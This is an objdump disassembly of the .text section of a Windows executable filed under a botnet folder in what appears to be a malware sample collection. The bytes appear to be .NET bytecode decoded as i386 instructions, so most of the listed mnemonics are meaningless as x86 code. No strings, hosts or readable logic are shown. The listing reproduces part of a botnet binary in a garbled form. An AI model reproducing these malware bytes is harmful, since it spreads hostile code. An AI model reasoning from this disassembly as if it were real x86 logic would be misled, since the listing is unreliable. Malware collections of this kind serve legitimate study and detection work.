
malware_samples/botnet/b1a89dd51a8818d41ee607a2997eb4c8b9201f43c1004247114d4ae0aec0ddf0.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f0 c7 00 00 00 00 00 	lock movl $0x0,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 cc                	add    %cl,%ah
  402015:	6d                   	insl   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	56                   	push   %esi
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 0a 22 00       	and    $0x220a72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 02                	jb     0x4021f8
  4021f6:	27                   	daa
  4021f7:	00 70 6f             	add    %dh,0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 0a 22 00       	and    $0x220a72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 14                	jb     0x40223a
  402226:	27                   	daa
  402227:	00 70 6f             	add    %dh,0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 14 27 00       	and    $0x271472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 04             	add    %dh,0x4(%edx)
  4024e4:	22 00                	and    (%eax),%al
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
